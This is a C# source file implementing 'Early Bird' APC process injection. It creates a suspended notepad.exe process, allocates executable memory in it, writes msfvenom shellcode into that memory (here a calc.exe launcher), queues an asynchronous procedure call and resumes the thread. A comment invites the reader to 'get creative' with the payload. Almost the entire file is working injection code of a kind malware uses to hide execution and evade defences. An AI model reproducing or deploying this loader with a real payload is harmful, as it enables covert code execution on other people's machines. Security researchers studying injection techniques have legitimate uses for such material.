// the only difference between this and APC is that in earlyBird we create a process in a suspended state, inject and then resume it

using System;
using System.Runtime.InteropServices;

[DllImport("kernel32.dll", SetLastError =true)]
static extern bool CreateProcessA(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO startupInfo, ref PROCESSINFORMATION lpProcessInformation);

[DllImport("kernel32.dll", SetLastError = true)]
static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, ulong dwData /* ulong NULL pointer, in C#: (ulong)IntPtr.Zero.ToInt64();*/ );

[DllImport("kernel32", SetLastError = true)]
static extern IntPtr VirtualAllocEx(IntPtr HANDLE, IntPtr LpAddress, int dwSize, ulong flAllocationType, ulong flProtect);

[DllImport("kernel32.dll", SetLastError = true)]
static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

[DllImport("kernel32.dll", SetLastError = true)]
static extern uint ResumeThread(IntPtr hThread);




uint CREATE_SUSPENDED = 0x00000004;
const ulong MEM_COMMIT_RESERVE = 0x00001000 | 0x00002000;
const ulong PAGE_READ_RIGHT_EXECUTE = 0x40;
IntPtr NULL = IntPtr.Zero; //this is a C/C++ NULL


UIntPtr BytesWritten;

// msfvenom -p windows/x64/exec CMD=calc.exe -f csharp  (GET CREATIVE)
byte[] shellcode = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 };


STARTUPINFO si = new();
PROCESSINFORMATION pi = new PROCESSINFORMATION();

// set STARTUPINFO size to its own size.
si.cb = Marshal.SizeOf(typeof(STARTUPINFO));


CreateProcessA(IntPtr.Zero, "notepad.exe", NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, ref si, ref pi);
Console.WriteLine("[*] Created a suspended notepad.exe process");

IntPtr memory = VirtualAllocEx(pi.hProcess, NULL, shellcode.Length, MEM_COMMIT_RESERVE, PAGE_READ_RIGHT_EXECUTE);
Console.WriteLine("[*] allocated memory");

WriteProcessMemory(pi.hProcess, memory, shellcode, (uint)shellcode.Length, out BytesWritten);
Console.WriteLine("[*] copied the shellcode to process");

QueueUserAPC(memory, pi.hThread, (ulong)NULL.ToInt64());
Console.WriteLine("[*] issued Async procedure call to thread");

Console.WriteLine("[*] resuming thread execution");
ResumeThread(pi.hThread);









// structures 
[StructLayout(LayoutKind.Sequential, CharSet =CharSet.Auto)]
public struct STARTUPINFO
{
    public int cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public int dwX;
    public int dwY;
    public int dwXSize;
    public int dwYSize;
    public int dwXCountChars;
    public int dwYCountChars;
    public int dwFillAttribute;
    public int dwFlags;
    public short wShowWindow;
    public short cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
public struct PROCESSINFORMATION
{
    public IntPtr hProcess;
    public IntPtr hThread;
    public int dwProcessId;
    public int dwThreadId;
}